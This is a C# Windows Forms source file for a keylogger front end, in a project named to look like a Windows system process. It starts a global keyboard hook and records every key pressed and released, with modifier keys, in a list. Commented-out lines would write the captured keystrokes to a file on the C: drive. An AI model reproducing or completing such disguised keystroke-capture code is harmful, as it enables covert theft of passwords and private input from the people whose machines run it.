using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

namespace Windows_Local_Host_Process
{
	public partial class Form1 : Form
	{
		public Form1()
		{
			Keylogger.StartWatching();

			Keylogger.KeyPressed += this.HandleLowLevelEvent;
			Keylogger.KeyReleased += this.HandleLowLevelEvent;

			this.InitializeComponent();
		}

		private void HandleLowLevelEvent(object sender, Keylogger.KeyboardEventData e)
		{
			string modifiers = e.ModifierKeys.Count > 0 ? $"({string.Join("+", e.ModifierKeys)}) + " : "";

			string log = $"{modifiers}{e.MainKey} {{{e.EventType}}}";

			this.listBox1.Items.Add(log);

			this.listBox1.SelectedIndex = this.listBox1.Items.Count - 1;

			//StreamWriter sw = new StreamWriter(@"C:\Bhola.txt", true);
			//sw.Write(log);
			//sw.Close();
		}

		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			Keylogger.StopWatching();
		}
	}
}
